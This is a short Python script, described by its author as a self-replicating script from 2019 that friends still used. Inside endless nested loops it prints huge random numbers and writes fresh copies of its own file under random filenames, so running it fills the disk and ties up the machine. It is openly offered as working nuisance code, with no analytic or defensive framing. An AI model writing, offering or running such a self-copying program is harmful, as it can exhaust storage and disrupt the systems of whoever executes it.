# Self replicating script, created early 2019
# Very messy code, some friends were still using this script so I decided to rewrite it

import os
import binascii
import random
while True:
 while True:
  while True:
   max=random.randint(0,99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999) 
   print(max)

   def replicate(path):
    
    with open(get_new_filename(path), "w") as newfile, open(path) as program:
     for line in program:
      newfile.write(line)


   def get_new_filename(old_name):
   
    broken_name = old_name.split('.')
    while True:
     ending = '-' + str(binascii.b2a_hex(os.urandom(3))).replace('\'', '')
     broken_name[-2] = broken_name[-2] + ending
     name = '.'.join(broken_name)
     if not os.path.exists(name):
      break
    return name


   if __name__ == '__main__':
    replicate(__file__)
